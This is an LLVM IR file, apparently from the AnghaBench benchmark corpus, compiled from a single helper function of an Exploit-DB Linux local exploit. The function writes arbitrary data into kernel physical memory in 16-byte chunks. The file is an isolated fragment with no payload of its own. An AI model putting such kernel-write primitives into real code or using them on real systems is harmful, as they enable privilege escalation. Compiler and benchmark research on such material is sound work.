; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20201.c_kernel_write.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20201.c_kernel_write.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAP_FAILED = common dso_local global i64* null, align 8
@.str = private unnamed_addr constant [24 x i8] c"not actually writing...\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @kernel_write(i64* %0, i64 %1, i64 %2, i64 %3) #0 {
  %5 = alloca i64*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca [4 x i64], align 16
  store i64* %0, i64** %5, align 8
  store i64 %1, i64* %6, align 8
  store i64 %2, i64* %7, align 8
  store i64 %3, i64* %8, align 8
  %14 = load i64, i64* %6, align 8
  %15 = call i64 @virt2phys(i64 %14)
  store i64 %15, i64* %9, align 8
  %16 = load i64*, i64** %5, align 8
  %17 = icmp ne i64* %16, null
  br i1 %17, label %18, label %22

18:                                               ; preds = %4
  %19 = load i64*, i64** %5, align 8
  %20 = load i64*, i64** @MAP_FAILED, align 8
  %21 = icmp eq i64* %19, %20
  br i1 %21, label %22, label %24

22:                                               ; preds = %18, %4
  %23 = call i32 @puts(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  br label %24

24:                                               ; preds = %22, %18
  %25 = load i64, i64* %8, align 8
  store i64 %25, i64* %10, align 8
  store i64 0, i64* %12, align 8
  br label %26

26:                                               ; preds = %63, %24
  %27 = load i64, i64* %12, align 8
  %28 = load i64, i64* %8, align 8
  %29 = icmp ult i64 %27, %28
  br i1 %29, label %30, label %66

30:                                               ; preds = %26
  %31 = load i64, i64* %10, align 8
  %32 = icmp ult i64 %31, 16
  br i1 %32, label %33, label %40

33:                                               ; preds = %30
  %34 = load i64*, i64** %5, align 8
  %35 = load i64, i64* %9, align 8
  %36 = load i64, i64* %12, align 8
  %37 = add i64 %35, %36
  %38 = getelementptr inbounds [4 x i64], [4 x i64]* %13, i64 0, i64 0
  %39 = call i32 @physread16(i64* %34, i64 %37, i64* %38)
  br label %40

40:                                               ; preds = %33, %30
  %41 = load i64, i64* %10, align 8
  %42 = icmp ugt i64 %41, 16
  br i1 %42, label %43, label %44

43:                                               ; preds = %40
  br label %46

44:                                               ; preds = %40
  %45 = load i64, i64* %10, align 8
  br label %46

46:                                               ; preds = %44, %43
  %47 = phi i64 [ 16, %43 ], [ %45, %44 ]
  store i64 %47, i64* %11, align 8
  %48 = getelementptr inbounds [4 x i64], [4 x i64]* %13, i64 0, i64 0
  %49 = load i64, i64* %7, align 8
  %50 = load i64, i64* %12, align 8
  %51 = add i64 %49, %50
  %52 = inttoptr i64 %51 to i8*
  %53 = load i64, i64* %11, align 8
  %54 = call i32 @memcpy(i64* %48, i8* %52, i64 %53)
  %55 = load i64*, i64** %5, align 8
  %56 = load i64, i64* %9, align 8
  %57 = load i64, i64* %12, align 8
  %58 = add i64 %56, %57
  %59 = getelementptr inbounds [4 x i64], [4 x i64]* %13, i64 0, i64 0
  %60 = call i32 @physwrite16(i64* %55, i64 %58, i64* %59)
  %61 = load i64, i64* %10, align 8
  %62 = sub i64 %61, 16
  store i64 %62, i64* %10, align 8
  br label %63

63:                                               ; preds = %46
  %64 = load i64, i64* %12, align 8
  %65 = add i64 %64, 16
  store i64 %65, i64* %12, align 8
  br label %26

66:                                               ; preds = %26
  ret void
}

declare dso_local i64 @virt2phys(i64) #1

declare dso_local i32 @puts(i8*) #1

declare dso_local i32 @physread16(i64*, i64, i64*) #1

declare dso_local i32 @memcpy(i64*, i8*, i64) #1

declare dso_local i32 @physwrite16(i64*, i64, i64*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
